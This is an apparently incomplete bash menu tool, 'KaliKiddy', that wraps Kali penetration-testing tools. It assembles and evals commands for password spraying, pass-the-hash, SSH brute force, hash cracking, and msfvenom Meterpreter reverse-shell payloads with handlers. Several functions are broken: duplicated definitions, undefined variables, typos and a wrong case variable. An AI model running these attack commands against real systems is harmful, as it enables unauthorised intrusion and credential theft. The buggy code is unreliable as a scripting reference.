#!/bin/bash

BLACK='\e[1;30m'
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
PURPLE='\e[1;35m'
LIGHTBLUE='\e[1;36m'
WHITE='\e[1;37m'
NC='\e[0m'

TITLE="KaliKiddy"

function banner(){
printf "${BLUE}..............\n"
printf "            ..,;:ccc,.\n"
printf "          ......''';lxO.\n"
printf ".....''''..........,:ld;\n"
printf "           .';;;:::;,,.x,\n"
printf "      ..'''.            0Xxoc:,.  ...\n"
printf "  ....                ,ONkc;,;cokOdc',.\n"
printf " .                   OMo           ':${GREEN}dd${BLUE}o.\n"
printf "                    dMc               :OO;\n"
printf "                    0M.                 .:o.\n"
printf "                    ;Wd\n"
printf "                     ;XO,\n"
printf "                       ,d0Odlc;,..\n"
printf "                           ..',;:cdOOd::,.\n"
printf "${PURPLE} _  __     _ _ _  ___     _     _   ${BLUE}.:d;.':;.\n"
printf "${PURPLE}| |/ /__ _| (_) |/ (_) __| | __| |_   _${BLUE}'d,  .'\n"
printf "${PURPLE}| ' // _\` | | | ' /| |/ _\` |/ _\` | | | |${BLUE};l   ..\n"
printf "${PURPLE}| . \ (_| | | | . \| | (_| | (_| | |_| |  ${BLUE}.o\n"
printf "${PURPLE}|_|\_\__,_|_|_|_|\_\_|\__,_|\__,_|\__, |    ${BLUE}c\n"
printf "${PURPLE}                                  |___/     ${BLUE}.'\n"
printf "${WHITE}PAKURI Version 6                             ${BLUE}. ${NC}\n"
}

function mainmenu(){
	clear
	figlet KaliKiddy
    menu_title=(" Kali-tools-top10" "" "")
    printf "${WHITE}"
    for ((i=0;i<3;i++))
    do
        printf "+---+\n"
        printf "| %s |%s\n" "$(($i+1))" " ${menu_title[$i]}"
        printf "+---+\n"
    done
    printf "${NC}"
}

function kalitoolstop10_menu1(){
	clear
	figlet kali-tools-top10
    printf "${BLUE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${WHITE}"
    menu_title=("wifite(aircrack-ng)" "burpsuite" "crackmapexec(SMB)" "hydra" "john")
    for ((i=0;i<5;i++))
    do
        printf "%5s+---+\n"
        printf "%5s| %s |%s\n" "" "$(($i+1))" " ${menu_title[$i]}"
        printf "%5s+---+\n"
    done
    printf "%5s+---+\n"
    printf "%5s| N |%s\n" "" " Next"
    printf "%5s+---+\n"
	printf "${NC}"
	read -n 1 -s NUM
	case $NUM in
	1)
		cmd_wifite
		;;
    2)
        cmd_burpsuite
        ;;
	3)
		menu_crackmapexec
		;;
	4)
		menu_hydra
		;;
	5)
		menu_john
		;;
    n|N)
        kalitoolstop10_menu2
        ;;
	*)
		;;
	esac

}

function kalitoolstop10_menu2(){
	clear
	figlet kali-tools-top10
    printf "${BLUE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${WHITE}"
    menu_title=("metasploit-framework" "nmap" "responder" "sqlmap" "wireshark(tshark)")
    for ((i=0;i<5;i++))
    do
        printf "%5s+---+\n"
        printf "%5s| %s |%s\n" "" "$(($i+1))" " ${menu_title[$i]}"
        printf "%5s+---+\n"
    done
    printf "%5s+---+\n"
    printf "%5s| B |%s\n" "" " Back"
    printf "%5s+---+\n"
	printf "${NC}"
    read -n 1 -s NUM
	case $NUM in
	1)
		menu_metasploit
		;;
	2)
		menu_nmap
		;;
	3)
		menu_responder
		;;
	4)
		menu_sqlmap
		;;
	5)
        cmd_wireshark
		;;
    b|B)
        kalitoolstop10_menu1
        ;;
	*)
		;;
	esac
}

function cmd_wifite(){
	clear
	figlet wifite
    printf "${BLUE}usage${NC}: wifite (${RED}Run as Root${NC})\n"
    printf "  wifite ${WHITE}[option|SETTINGS]${NC}\n"
    echo "options:"
	echo "  -h, --help              show this help message and exit"
	echo ""
	echo "SETTINGS:"
	echo "  -v, --verbose           Shows more options (-h -v). Prints commands and outputs."
	echo "                           (default:quiet)"
	echo "  -i [interface]          Wireless interface to use, e.g. wlan0mon (default: ask)"
	echo "  -c [channel]            Wireless channel to scan e.g. 1,3-6 (default: all 2Ghz channels)"
	echo "  -ab, --allbands         Include both 2.4Ghz and 5Ghz bands (default: off)"
	echo "  -2, --2ghz              Include 2.4Ghz channels (default: off)"
	echo "  -5, --5ghz              Include 5Ghz channels (default: off)"
	echo "  -inf, --infinite        Enable infinite attack mode. Modify scanning time with -p (default:off)"
	echo "  -mac, --random-mac      Randomize wireless card MAC address (default: off)"
	echo "  -p [scan_time]          Pillage: Attack all targets after scan_time (seconds)"
    cmd="wifite "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]$cmd${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        cmd="$cmd &"
        eval $cmd
    fi
}

function cmd_burpsuite(){
	clear
	figlet Burpsuite
    cmd="burpsuite"
    printf "${RED}Caution!\n"
    printf "${WHITE}This is a GUI application. It can't be displayed on a remote console.${NC}\n"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        cmd="$cmd &"
        eval $cmd
    fi
}
function menu_crackmapexec(){
	clear
	figlet crackmapexec
	printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 3 |%s\n" "" " crackmapexec(SMB)"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " Target format(Basic)"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Null session"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Connect to target using local account"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 4 |%s\n" "" " Path the hash against a subnet"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 5 |%s\n" "" " Brutefocing & Password Spraying"
    printf "%10s+---+%s${NC}\n"
    read -n 1 -s NUM
    case $NUM in
    1)
        cmd_crackmapexec1
        ;;
    2)
        cmd_crackmapexec2
        ;;
    3)
        cmd_crackmapexec3
        ;;
    4)
        cmd_crackmapexec4
        ;;
    5)
        cmd_crackmapexec5
        ;;
    *)
        ;;
	esac
}

function cmd_crackmapexec1(){
	clear
	figlet crackmapexec
    printf "${BLUE}positional arguments${NC}:\n"
    echo "  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"
    printf "${BLUE}usage${NC}: crackmapexec smb [target ...]\n"
    read -e -p "Target: " $TARGET
    cmd="crackmapexec "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[1]Target format(Basic)${NC}\n"
    cmd="${CMD} $TARGET"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_crackmapexec2(){
	clear
	figlet crackmapexec
    printf "${BLUE}positional arguments${NC}:\n"
    echo "  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"
    printf "${BLUE}usage${NC}: crackmapexec smb [target ...] -u "" up ""\n"
    read -e -p "Target: " TARGET
    cmd="crackmapexec "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[2]Null session${NC}\n"
    cmd="${CMD} $TARGET -u \"\" up \"\""
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_crackmapexec3(){
	clear
	figlet crackmapexec
    printf "${BLUE}positional arguments${NC}:\n"
    echo "  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"
    printf "${BLUE}options:#{NC}\n"
    echo "  -u USERNAME [USERNAME ...]"
    echo "                        username(s) or file(s) containing usernames"
    echo "  -p PASSWORD [PASSWORD ...]"
    echo "                        password(s) or file(s) containing passwords"
    echo "  --local-auth          authenticate locally to each target"
    printf "${BLUE}usage${NC}: crackmapexec smb [target ...] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [--local-auth]\n"
    read -e -p "Target: " $TARGET
    read -e -p "Username: " USERNAME
    read -e -p "Password: " PASSWORD
    cmd="crackmapexec "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[3]Connect to target using local account${NC}\n"
    cmd="${CMD} $TARGET -u $USERNAME -p $PASSWORD --local-auth"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_crackmapexec4(){
	clear
	figlet crackmapexec
    printf "${BLUE}positional arguments${NC}:\n"
    echo "  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"
    printf "${BLUE}options:#{NC}\n"
    echo "  -u USERNAME [USERNAME ...]"
    echo "                        username(s) or file(s) containing usernames"
    echo "  -H HASH [HASH ...], --hash HASH [HASH ...]"
    echo "                        NTLM hash(es) or file(s) containing NTLM hashes"
    printf "${BLUE}usage${NC}: crackmapexec smb [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--export EXPORT [EXPORT ...]]\n"
    echo "                        [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]"
    echo "                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}] [--server-host HOST] [--server-port PORT]"
    echo "                        [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE]"
    echo "                        [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--continue-on-success] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]]"
    echo "                        [--sam | --lsa | --ntds [{vss,drsuapi}]] [--shares] [--sessions] [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]]"
    echo "                        [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]"
    echo "                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--pattern PATTERN [PATTERN ...] | --regex REGEX"
    echo "                        [REGEX ...]] [--depth DEPTH] [--only-files] [--put-file FILE FILE] [--get-file FILE FILE]"
    echo "                        [--exec-method {atexec,mmcexec,smbexec,wmiexec}] [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]"
    echo "                        [--clear-obfscripts]"
    echo "                        [target ...]"
    printf "${BLUE}usage${NC}: crackmapexec smb [target ...] [-u USERNAME [USERNAME ...]] [-H HASH [HASH ...]] [--local-auth]\n"
    read -e -p "Target(subnet): " TARGET
    read -e -p "Hash(LMHASH:NTHASH|NTHASH): " HASH
    echo "Hash Type:"
    echo "  1) LMHASH:NTHASH"
    echo "  2) NTHASH"
    read -n 1 -s NUM
    case $NUM in
        1)
            AUTH="--local-auth"
            ;;
        2)
            AUTH=""
            ;;
    esac
    cmd="crackmapexec "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[4]Path the hash against a subnet${NC}\n"
    cmd="${CMD} smb $TARGET -u $USERNAME -H '$HASH' $AUTH"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_crackmapexec4(){
	clear
	figlet crackmapexec
    printf "${BLUE}positional arguments${NC}:\n"
    echo "  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"
    printf "${BLUE}options:#{NC}\n"
    echo "  -u USERNAME [USERNAME ...]"
    echo "                        username(s) or file(s) containing usernames"
    echo "  -p PASSWORD [PASSWORD ...]"
    echo "                        password(s) or file(s) containing passwords"
    echo "  -H HASH [HASH ...], --hash HASH [HASH ...]"
    echo "                        NTLM hash(es) or file(s) containing NTLM hashes"
    printf "${BLUE}usage${NC}: crackmapexec smb [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--export EXPORT [EXPORT ...]]\n"
    echo "                        [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]"
    echo "                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}] [--server-host HOST] [--server-port PORT]"
    echo "                        [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE]"
    echo "                        [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--continue-on-success] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]]"
    echo "                        [--sam | --lsa | --ntds [{vss,drsuapi}]] [--shares] [--sessions] [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]]"
    echo "                        [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]"
    echo "                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--pattern PATTERN [PATTERN ...] | --regex REGEX"
    echo "                        [REGEX ...]] [--depth DEPTH] [--only-files] [--put-file FILE FILE] [--get-file FILE FILE]"
    echo "                        [--exec-method {atexec,mmcexec,smbexec,wmiexec}] [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]"
    echo "                        [--clear-obfscripts]"
    echo "                        [target ...]"
    printf "${BLUE}usage${NC}: crackmapexec smb [target ...] [-u USERNAME [USERNAME ...]] [[-p PASSWORD [PASSWORD ...]]|[-H HASH [HASH ...]]]\n"
    read -e -p "Target(subnet): " TARGET
    read -e -p "Username: " USERNAME
    read -n 1 -p "Use password? y|n >" PASS_HASH
    if [ $PASS_HASH = y ] || [ $PASS_HASH = "Y" ];then
        read -e -p "Password: " PASSWORD
        cmd="${CMD} $TARGET -u $USERNAME -p $PASSWORD"
    else
        read -e -p "Hash(LMHASH:NTHASH|NTHASH): " HASH
        cmd="${CMD} smb $TARGET -u $USERNAME -H '$HASH'"
    fi
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]crackmapexec${NC} > ${BLUE}[5]Brutefocing & Password Spraying${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_hydra(){
	clear
	figlet hydra
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 4 |%s\n" "" " hydra"
    printf "%5s+---+\n"
	printf "${WHITE}%10s+---+\n"
	printf "%10s| 1 |%s\n" "" " Brute force the username admin "
	printf "%10s+---+%s\n" "" " with the given password list"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Brute force SSH with user and password lists"
    printf "%10s+---+%s\n${NC}" "" " against target IP address"
    read -n 1 -s NUM
    case $NUM in
    1)
        cmd_hydra1
        ;;
    2)
        cmd_hydra2
        ;;
    *)
        ;;
	esac
}

function cmd_hydra1(){
    clear
    figlet hydra
	printf "${BLUE}Options${NC}:\n"
    echo "  -l LOGIN or -L FILE     login with LOGIN name, or load several logins from FILE"
    echo "  -p PASS  or -P FILE     try password PASS, or load several passwords from FILE"
    echo "  -t TASKS                run TASKS number of connects in parallel per target (default: 16)"
    echo "  -v / -V / -d            verbose mode / show login+pass for each attempt / debug mode "
	echo "  server                  the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)"
	echo "  service                 the service to crack (see below for supported protocols)"
	printf "${BLUE}usage${NC}: hydra ${WHITE}[[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]${NC}\n"
	printf "${RED}Example${NC}:   hydra -t 1 -l admin -P <PASSWORD_LIST_PATH> -v ftp://<IP_ADDRESS> ftp\n"
    read -p "usernsme: " USERNAME
    read -e -p "password list path:" PASSWORD_LIST_PATH
    read -p "IP Address:" IP_ADDRESS
    read -p "service: " SERVICE
    cmd="hydra"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]$cmd${NC} > ${BLUE}[1]Brute force${NC}\n"
    cmd="$cmd -t -l $USERNAME -P $PASSWORD_LIST_PATH -v $SERVICE://$IP_ADDRESS $SERVICE"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_hydra2(){
    clear
    figlet hydra
    printf "${BLUE}Options:${NC}\n"
    printf "${BLUE}usage${NC}: hydra ${WHITE}[[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]${NC}\n"
    echo "  -l LOGIN or -L FILE     login with LOGIN name, or load several logins from FILE"
    echo "  -p PASS  or -P FILE     try password PASS, or load several passwords from FILE"
	echo "  -u                      loop around users, not passwords (effective! implied with -x)"
	echo "  -t TASKS                run TASKS number of connects in parallel per target (default: 16)"
	echo "  -v / -V / -d            verbose mode / show login+pass for each attempt / debug mode "
    echo "  server                  the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)"
    echo "  service                 the service to crack (see below for supported protocols)"
    printf "${RED}Example${NC}:  hydra -v -u -L <USER_LIST_PATH> -P <PASSWORD_LIST_PATH> -t 1 ssh://<IP_ADDRESS>\n"
    read -e -p "username list path: " USER_LIST_PATH
    read -e -p "password list path:" PASSWORD_LIST_PATH
    read -p "IP Address:" IP_ADDRESS
    read -p "service: " SERVICE
    cmd="hydra "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]$cmd${NC} > ${BLUE}[2]Brute force SSH${NC}\n"
    cmd="$cmd -t -l $USERNAME -P $PASSWORD_LIST_PATH -v $SERVICE://$IP_ADDRESS $SERVICE"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_john(){
	clear
	figlet john
	printf "${WHITE}+---+\n"
	printf "| 1 |%s\n" " Kali-tools-top10"
	printf "+---+\n"
	printf "${BLUE}%5s+---+\n"
	printf "%5s| 5 |%s\n" "" " john"
	printf "%5s+---+\n"
	printf "${WHITE}%10s+---+\n"
	printf "%10s| 1 |%s\n" "" " Cracking with a wordlist"
	printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Attempt to crack hash file"
    printf "%10s+---+%s\n" "" " using previously cracked passwords"
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Show cracked passwords"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 4 |%s\n" "" " Attempt to crack hash using incremental mode"
    printf "%10s+---+%s${NC}\n" "" " (May take a long time)"
	read -n 1 -s NUM
    case $NUM in
    1)
        cmd_john1
        ;;
    2)
        cmd_john2
        ;;
	3)
		cmd_john3
		;;
	4)
		cmd_john4
		;;
    *)
        ;;
    esac
}

function cmd_john1(){
    clear
    figlet john
    printf "${BLUE}usage${NC} :john ${WHITE}[OPTIONS] [PASSWORD-FILES]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
	echo "  --wordlist[=FILE] --stdin  Wordlist mode, read words from FILE or stdin"
	echo "                    --pipe   like --stdin, but bulk reads, and allows rules"
    printf "${RED}Example${NC}:  john --wordlist=<WORD_LIST_PATH> <HASH_LIST_FILE>\n"
    read -e -p "word list path: " WORD_LIST_PATH
    read -e -p "hash list path:" HASH_LIST_PATH
    cmd="john "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[5]$cmd${NC} > ${BLUE}[1]Cracking with a wordlist${NC}\n"
    cmd="${cmd} --wordlist=${WORD_LIST_PATH} ${HASH_LIST_PATH}"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_john2(){
    clear
    figlet john
    printf "${BLUE}usage${NC}: john ${WHITE}[OPTIONS] [PASSWORD-FILES]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
	echo "  --loopback[=FILE]   Like --wordlist, but extract words from a .pot file"
    printf "${RED}Example${NC}:  john --loopback <HASH_LIST_FILE>\n"
    read -e -p "hash list path:" HASH_LIST_PATH
    cmd="john "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[5]$cmd${NC} > ${BLUE}[2]Hash Crack(using previously cracked passwords)${NC}\n"
    cmd="${cmd} --loopback ${HASH_LIST_PATH}"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_john3(){
    clear
    figlet john
    printf "${BLUE}usage${NC}: john ${WHITE}[OPTIONS] [PASSWORD-FILES]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
	echo "  --show[=left]              Show cracked passwords [if =left, then uncracked]"
    printf "${RED}Example${NC}:  john --show <HASH_LIST_FILE>\n"
    read -e -p "hash list path:" HASH_LIST_PATH
    cmd="john "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[5]$cmd${NC} > ${BLUE}[3]Show cracked passwords${NC}\n"
    cmd="${cmd} --show ${HASH_LIST_PATH}"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_john4(){
    clear
    figlet john
    printf "${BLUE}usage${NC}: john ${WHITE}[OPTIONS] [PASSWORD-FILES]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
	echo "  --incremental[=MODE]       \"Incremental\" mode [using section MODE]"
    printf "${RED}Example${NC}:  john --incremental <HASH_LIST_FILE>\n"
    read -e -p "hash list path:" HASH_LIST_PATH
    cmd="john "
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[5]$cmd${NC} > ${BLUE}[4]Hash crack using incremental mode${NC}\n"
    cmd="${cmd} --incremental ${HASH_LIST_PATH}"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_metasploit(){
	clear
	figlet Metasploit
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 1 |%s\n" "" " metasploit-framework"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " Normal Boot"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Create Multi handler" 
    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Create Payload"
    printf "%10s+---+%s${NC}\n"
	read -n 1 -s NUM
    echo ""
    case $ANS in
    1)
        cmd_metasploit1
        ;;
    2)
        cmd_metasploit2
        ;;
	3)
		cmd_metasploit3
		;;
    *)
        ;;
    esac
}

function cmd_metasploit1(){
	clear
	figlet Metasploit
    printf "${BLUE}usage${NC} :Usage: msfconsole ${WHITE}[options]${NC}"
    printf "${BLUE}Options${NC}:\n"
    echo "  -q, --quiet                      Do not print the banner on startup"
    echo "  -r, --resource FILE              Execute the specified resource file (- for stdin)"
    echo "  -h, --help                       Show this message    "
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[1]Normal Boot${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_metasploit2(){
	clear
	figlet Metasploit
    echo "Create handler..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    cat <<EOF >> resouce.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exsploit
EOF
    echo ""
    echo "PAYLOAD: windows/meterpreter/reverse_tcp"
    echo "LHOST  : $LHOST"
    echo "LPORT  : $LPORT"
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[2]Create Multi Handler${NC}\n"
    cmd+=" -r resouce.rc"
    echo "└─Command? > $cmd"
    read -e -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
    rm resouce.rc
}

function cmd_metasploit3(){
	clear
	figlet Metasploit
    echo "Create Payload..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    echo ""
    echo "PAYLOAD  : windows/meterpreter/reverse_tcp"
    echo "LHOST    : $LHOST"
    echo "LPORT    : $LPORT"
    echo "Filetype : exe"
    cmd="msfvenom"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[3]Create Payload${NC}\n"
    cmd="$cmd -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f exe > `pwd`/reverse_tcp.exe"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_nmap(){
	clear
	figlet Nmap
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 2 |%s\n" "" " nmap"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " Ping Scan"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Intense Scan" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Intense Scan + UDP" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 4 |%s\n" "" " Intense Scan all TCP Port" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 5 |%s\n" "" " Vuln Scan" 
    printf "%10s+---+%s${NC}\n" 
	read -n 1 -s NUM
    case $NUM in
    1)
        cmd_nmap1
        ;;
    2)
        cmd_nmap2
        ;;
	3)
        cmd_nmap3
		;;
    4)
        cmd_nmap4
        ;;
    5)
        cmd_nmap5
        ;;
    *)
        ;;
    esac
}

function cmd_nmap1(){
    clear
	figlet Nmap
    printf "${BLUE}usage${NC}: nmap ${WHITE}[Scan Type...] [Options] {target specification}${NC}\n"
    printf "${BLUE}Options${NC}:\n"
